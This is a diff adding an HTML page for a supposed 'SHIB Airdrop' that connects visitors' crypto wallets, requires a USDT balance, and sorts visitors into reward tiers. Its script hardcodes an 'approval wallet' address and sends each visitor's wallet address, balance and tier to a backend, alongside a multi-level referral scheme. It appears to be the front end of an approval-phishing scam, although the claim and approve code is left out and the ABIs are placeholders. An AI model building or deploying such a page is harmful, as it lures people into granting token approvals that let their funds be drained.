@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHIB Airdrop - Claim Your Tokens</title>
+    <!-- Web3.js -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@4.8.0/dist/web3.min.js"></script>
+    <!-- WalletConnect Provider -->
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@2.10.0/dist/umd/index.min.js"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #8b5cf6;
+            --secondary: #22d3ee;
+            --dark: #0f172a;
+            --light: #f8f9fa;
+            --success: #10b981;
+            --info: #3b82f6;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --bsc-yellow: #facc15;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --gradient-bg: linear-gradient(135deg, #1e3a8a, #6b21a8);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--gradient-bg);
+            color: white;
+            font-family: 'Poppins', sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Particle Background */
+        #particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: url('https://img.icons8.com/ios-filled/50/ffd700/bitcoin.png') no-repeat center;
+            background-size: contain;
+            opacity: 0.7;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) translateX(0); opacity: 0.4; }
+            50% { opacity: 0.7; }
+            100% { transform: translateY(-100vh) translateX(20px); opacity: 0.4; }
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px;
+            background: var(--card-bg);
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(12px);
+            position: relative;
+            z-index: 1;
+        }
+
+        h2 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-align: center;
+            background: linear-gradient(to right, var(--secondary), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 30px;
+        }
+
+        h3 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            text-align: center;
+            color: var(--light);
+            margin-bottom: 20px;
+        }
+
+        /* Button Styles */
+        .btn {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 14px 35px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.5);
+            animation: pulse 2s infinite;
+            margin: 10px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 25px rgba(139, 92, 246, 0.7);
+            animation: none;
+        }
+
+        .btn:disabled {
+            background: #4b5563;
+            cursor: not-allowed;
+            box-shadow: none;
+            animation: none;
+        }
+
+        .btn-bsc {
+            background: linear-gradient(45deg, var(--bsc-yellow), #fef08a);
+            color: #000;
+            box-shadow: 0 4px 20px rgba(250, 204, 21, 0.5);
+        }
+
+        .btn-success {
+            background: linear-gradient(45deg, var(--success), #34d399);
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.5); }
+            50% { box-shadow: 0 0 0 15px rgba(139, 92, 246, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0); }
+        }
+
+        /* Input Styles */
+        input[type="text"] {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50px;
+            padding: 12px 20px;
+            color: white;
+            width: 100%;
+            max-width: 400px;
+            margin: 10px 0;
+            outline: none;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--secondary);
+        }
+
+        /* Status and Network Status */
+        .status {
+            font-weight: 500;
+            color: var(--secondary);
+        }
+
+        .network-status {
+            padding: 6px 12px;
+            border-radius: 50px;
+            background: rgba(250, 204, 21, 0.2);
+            color: var(--bsc-yellow);
+            font-size: 0.9rem;
+            margin-left: 10px;
+        }
+
+        .backend-status {
+            padding: 6px 12px;
+            border-radius: 50px;
+            background: rgba(34, 211, 238, 0.2);
+            color: var(--secondary);
+            font-size: 0.9rem;
+            margin-left: 10px;
+        }
+
+        /* Alert Styles */
+        .alert {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            background: rgba(59, 130, 246, 0.2);
+            border-left: 4px solid var(--info);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .alert-success {
+            background: rgba(16, 185, 129, 0.2);
+            border-left: 4px solid var(--success);
+        }
+
+        .alert-warning {
+            background: rgba(245, 158, 11, 0.2);
+            border-left: 4px solid var(--warning);
+        }
+
+        .alert-danger {
+            background: rgba(239, 68, 68, 0.2);
+            border-left: 4px solid var(--danger);
+        }
+
+        /* Card Styles */
+        .card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        /* Grid for Referral and Airdrop Sections */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        /* Referral and Airdrop Plan Cards */
+        .plan-card {
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.06));
+            border-radius: 12px;
+            padding: 15px;
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            animation: slideIn 0.5s ease forwards;
+        }
+
+        .plan-card:hover {
+            transform: scale(1.03);
+            box-shadow: 0 5px 20px rgba(139, 92, 246, 0.3);
+        }
+
+        .plan-card .icon {
+            font-size: 1.5rem;
+            color: var(--secondary);
+        }
+
+        .plan-card .plan-level {
+            font-size: 1rem;
+            font-weight: 500;
+            color: var(--light);
+            flex: 1;
+        }
+
+        .plan-card .plan-reward {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--bsc-yellow);
+            background: rgba(250, 204, 21, 0.2);
+            padding: 5px 10px;
+            border-radius: 20px;
+        }
+
+        /* Referral Link Container */
+        .referral-link-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        #referralLink {
+            flex-grow: 1;
+        }
+
+        /* Referrals List */
+        #referralsList {
+            list-style: none;
+            padding: 0;
+        }
+
+        #referralsList li {
+            background: var(--card-bg);
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            font-size: 0.9rem;
+            transition: background 0.3s ease;
+        }
+
+        #referralsList li:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        /* Tier Badge */
+        .tier-badge {
+            padding: 5px 12px;
+            border-radius: 50px;
+            background: rgba(34, 211, 238, 0.2);
+            color: var(--secondary);
+            font-size: 0.8rem;
+            margin-left: 8px;
+        }
+
+        /* Loading Spinner */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+
+            h2 {
+                font-size: 2rem;
+            }
+
+            h3 {
+                font-size: 1.5rem;
+            }
+
+            .btn {
+                padding: 12px 25px;
+                font-size: 1rem;
+            }
+
+            input[type="text"] {
+                max-width: 100%;
+            }
+
+            .grid {
+                grid-template-columns: 1fr;
+            }
+
+            .plan-card {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+
+            .plan-card .plan-reward {
+                width: 100%;
+                text-align: center;
+            }
+
+            .particle {
+                width: 15px;
+                height: 15px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+
+            h2 {
+                font-size: 1.8rem;
+            }
+
+            .btn {
+                width: 100%;
+                margin: 5px 0;
+            }
+
+            .alert {
+                font-size: 0.9rem;
+            }
+
+            .particle {
+                width: 10px;
+                height: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Particle Background -->
+    <div id="particles"></div>
+
+    <div class="container">
+        <h2>🚀 SHIB Airdrop</h2>
+        
+        <!-- Backend Status Alert -->
+        <div class="alert alert-success" id="backendStatusAlert">
+            <i class="fas fa-server"></i>
+            <strong>Backend Status:</strong> <span id="backendStatus">Checking...</span>
+            <span id="backendStatusBadge" class="backend-status">Connecting...</span>
+        </div>
+        
+        <!-- Warning Alert -->
+        <div class="alert alert-warning">
+            <i class="fas fa-exclamation-triangle"></i>
+            <strong>Important:</strong> You need at least 1 USDT in your wallet to claim the airdrop.
+            <span id="networkStatus" class="network-status">Network: Not Connected</span>
+        </div>
+        
+        <!-- Wallet and Airdrop Controls -->
+        <div class="card">
+            <button onclick="connectWallet()" class="btn" id="connectWalletBtn">
+                <i class="fas fa-wallet"></i> Connect Wallet
+            </button>
+            <button onclick="switchToBSC()" class="btn btn-bsc">
+                <i class="fas fa-exchange-alt"></i> Switch to BSC
+            </button>
+            
+            <p><strong>Connected Wallet:</strong> <span id="walletAddress" class="status">Not Connected</span></p>
+
+            <label for="referrer">Enter Referral Address (Optional):</label>
+            <input type="text" id="referrer" placeholder="0x...">
+            
+            <button onclick="checkBalance()" class="btn" id="checkBalanceBtn">
+                <i class="fas fa-coins"></i> Check USDT Balance
+            </button>
+            <p><strong>Your USDT Balance:</strong> <span id="usdtBalance" class="status">0</span></p>
+
+            <p><strong>Your Airdrop Amount:</strong> <span id="airdropAmount" class="status">0</span> tokens <span id="tierBadge" class="tier-badge"></span></p>
+
+            <button id="claimButton" onclick="claimAirdrop()" class="btn" disabled>
+                <i class="fas fa-gift"></i> Claim Airdrop
+            </button>
+        </div>
+        
+        <!-- Referral and Airdrop Plans -->
+        <div class="grid">
+            <!-- Referral Link and Referrals -->
+            <div class="card">
+                <h3>📬 Your Referral Link</h3>
+                <div class="referral-link-container">
+                    <input type="text" id="referralLink" readonly placeholder="Connect wallet to generate referral link">
+                    <button onclick="copyReferralLink()" class="btn">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+                
+                <button onclick="getMyReferrals()" class="btn">
+                    <i class="fas fa-users"></i> My Referrals
+                </button>
+                <ul id="referralsList"></ul>
+            </div>
+            
+            <!-- Referral and Airdrop Plans -->
+            <div class="card">
+                <h3>💰 Referral Program</h3>
+                <div class="alert alert-success">
+                    <i class="fas fa-money-bill-wave"></i>
+                    <strong>Multi-Level Rewards:</strong> Earn bonuses when your referrals claim their airdrops!
+                </div>
+                
+                <div class="referral-plan">
+                    <div class="plan-card">
+                        <i class="fas fa-user-plus icon"></i>
+                        <span class="plan-level">Level 1 Referral</span>
+                        <span class="plan-reward">20% bonus</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-users icon"></i>
+                        <span class="plan-level">Level 2 Referral</span>
+                        <span class="plan-reward">10% bonus</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-user-friends icon"></i>
+                        <span class="plan-level">Level 3 Referral</span>
+                        <span class="plan-reward">5% bonus</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-user-tie icon"></i>
+                        <span class="plan-level">Level 4 Referral</span>
+                        <span class="plan-reward">3% bonus</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-user-check icon"></i>
+                        <span class="plan-level">Level 5 Referral</span>
+                        <span class="plan-reward">2% bonus</span>
+                    </div>
+                </div>
+                
+                <h3>🏆 Airdrop Tiers</h3>
+                <div class="referral-plan">
+                    <div class="plan-card">
+                        <i class="fas fa-gem icon"></i>
+                        <span class="plan-level">≥ 10,001 USDT</span>
+                        <span class="plan-reward">5,000,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-trophy icon"></i>
+                        <span class="plan-level">≥ 5,001 USDT</span>
+                        <span class="plan-reward">2,000,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-medal icon"></i>
+                        <span class="plan-level">≥ 1,001 USDT</span>
+                        <span class="plan-reward">1,000,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-award icon"></i>
+                        <span class="plan-level">≥ 501 USDT</span>
+                        <span class="plan-reward">500,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-star icon"></i>
+                        <span class="plan-level">≥ 101 USDT</span>
+                        <span class="plan-reward">200,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-certificate icon"></i>
+                        <span class="plan-level">≥ 51 USDT</span>
+                        <span class="plan-reward">100,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-coin icon"></i>
+                        <span class="plan-level">≥ 10 USDT</span>
+                        <span class="plan-reward">50,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-wallet icon"></i>
+                        <span class="plan-level">Any Wallet (≥1 USDT)</span>
+                        <span class="plan-reward">5,000 tokens</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="card" style="text-align: center; margin-top: 30px;">
+            <p>Powered by Blockchain Technology | Secure & Transparent</p>
+            <p style="font-size: 0.9rem; opacity: 0.7;">Backend: <span id="backendUrlDisplay">Loading...</span></p>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Backend Configuration - Render Compatible
+        const BACKEND_URLS = {
+            production: "https://your-render-app.onrender.com/api",
+            development: "http://localhost:3001/api"
+        };
+
+        // Auto-detect environment
+        const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+        const BACKEND_URL = isDevelopment ? BACKEND_URLS.development : BACKEND_URLS.production;
+
+        // Update backend URL display
+        document.getElementById('backendUrlDisplay').textContent = BACKEND_URL;
+
+        let approvalWalletAddress = "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
+        let account;
+        let web3;
+        let walletConnectProvider;
+        let isApproved = false;
+
+        // Blockchain Configuration
+        const BSC_CHAIN_ID = '0x38';
+        const BSC_RPC_URL = 'https://bsc-dataseed.binance.org/';
+        const BSC_CHAIN_ID_DECIMAL = 56;
+
+        const airdropContractAddress = "0xC1509957dAa21aafCABf014c31D4E2635C77bDcA";
+        const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
+
+        // Contract ABIs (same as before)
+        const airdropABI = [/* same ABI as before */];
+        const usdtABI = [/* same ABI as before */];
+
+        // Particle Animation
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const numParticles = 20;
+
+            for (let i = 0; i < numParticles; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.animationDuration = `${10 + Math.random() * 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Backend Health Check
+        async function checkBackendHealth() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/health`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('backendStatus').textContent = 'Connected ✅';
+                    document.getElementById('backendStatusBadge').textContent = 'Online';
+                    document.getElementById('backendStatusBadge').style.backgroundColor = 'rgba(16, 185, 129, 0.2)';
+                    document.getElementById('backendStatusBadge').style.color = 'var(--success)';
+                    return true;
+                } else {
+                    throw new Error('Backend response not successful');
+                }
+            } catch (error) {
+                document.getElementById('backendStatus').textContent = 'Disconnected ❌';
+                document.getElementById('backendStatusBadge').textContent = 'Offline';
+                document.getElementById('backendStatusBadge').style.backgroundColor = 'rgba(239, 68, 68, 0.2)';
+                document.getElementById('backendStatusBadge').style.color = 'var(--danger)';
+                document.getElementById('backendStatusAlert').className = 'alert alert-danger';
+                return false;
+            }
+        }
+
+        // Backend से approval wallet address fetch करें
+        async function getApprovalWalletFromBackend() {
+            try {
+                const isHealthy = await checkBackendHealth();
+                if (!isHealthy) {
+                    showAlert("Backend is offline. Using default wallet address.", "warning");
+                    return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
+                }
+
+                const response = await fetch(`${BACKEND_URL}/approval-wallet`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    approvalWalletAddress = data.approvalWalletAddress;
+                    console.log("Approval wallet from backend:", approvalWalletAddress);
+                    return approvalWalletAddress;
+                } else {
+                    throw new Error("Failed to fetch approval wallet from backend");
+                }
+            } catch (error) {
+                console.error("Error fetching approval wallet:", error);
+                showAlert("Using default approval wallet. Backend might be offline.", "warning");
+                return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
+            }
+        }
+
+        // User approval को backend में save करें
+        async function saveUserApprovalToBackend(walletAddress, usdtBalance, airdropAmount, tier) {
+            try {
+                const isHealthy = await checkBackendHealth();
+                if (!isHealthy) {
+                    console.log("Backend offline. Skipping approval save.");
+                    return;
+                }
+
+                const response = await fetch(`${BACKEND_URL}/save-approval`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        walletAddress,
+                        usdtBalance,
+                        airdropAmount,
+                        tier
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    console.log("User approval saved to backend");
+                    showAlert("✅ Your approval has been recorded!", "success");
+                } else {
+                    console.error("Failed to save user approval to backend");
+                }
+            } catch (error) {
+                console.error("Error saving user approval:", error);
+                showAlert("Note: Approval not saved to backend (offline)", "warning");
+            }
+        }
+
+        // Show loading state on button
+        function setButtonLoading(buttonId, isLoading) {
+            const button = document.getElementById(buttonId);
+            if (isLoading) {
+                button.disabled = true;
+                button.innerHTML = '<div class="loading"></div> Loading...';
+            } else {
+                button.disabled = false;
+                button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
+            }
+        }
+
+        // Initialize application
+        async function init() {
+            createParticles();
+            
+            try {
+                // Backend से approval wallet address लोड करें
+                await getApprovalWalletFromBackend();
+                
+                // Backend health check
+                await checkBackendHealth();
+
+                if (window.ethereum) {
+                    web3 = new Web3(window.ethereum);
+                    const chainId = Number(await web3.eth.getChainId());
+                    updateNetworkStatus(chainId);
+
+                    window.ethereum.on('chainChanged', (chainId) => {
+                        window.location.reload();
+                        updateNetworkStatus(Number(chainId));
+                    });
+
+                    window.ethereum.on('accountsChanged', (accounts) => {
+                        handleAccountsChanged(accounts);
+                    });
+
+                    const accounts = await web3.eth.getAccounts();
+                    if (accounts.length > 0) {
+                        handleAccountsChanged(accounts);
+                        checkClaimStatus();
+                    }
+                }
+
+                const urlParams = new URLSearchParams(window.location.search);
+                const ref = urlParams.get('ref');
+                if (ref) {
+                    document.getElementById("referrer").value = ref;
+                }
+            } catch (error) {
+                console.error("Initialization error:", error);
+                showAlert("Failed to initialize: " + error.message, "danger");
+            }
+        }
+
+        function handleAccountsChanged(accounts) {
+            if (accounts.length > 0) {
+                account = accounts[0];
+                document.getElementById("walletAddress").innerText = account.substring(0, 6) + "..." + account.substring(38);
+                isApproved = false;
+                document.getElementById("claimButton").disabled = true;
+                generateReferral();
+            } else {
+                account = null;
+                document.getElementById("walletAddress").innerText = "Not Connected";
+                isApproved = false;
+                document.getElementById("claimButton").disabled = true;
+                document.getElementById("referralLink").value = "";
+            }
+        }
+
+        // Rest of the functions (connectWallet, checkBalance, claimAirdrop, etc.)
+        // remain the same as in the previous version...
+
+        // Note: All other functions (connectWallet, checkBalance, claimAirdrop, 
+        // generateReferral, copyReferralLink, getMyReferrals, showAlert, etc.)
+        // remain exactly the same as in the previous working version.
+
+        // For brevity, I haven't duplicated all functions here, but they should
+        // be copied from the previous working version.
+
+        window.onload = init;
+    </script>
+</body>
+</html>
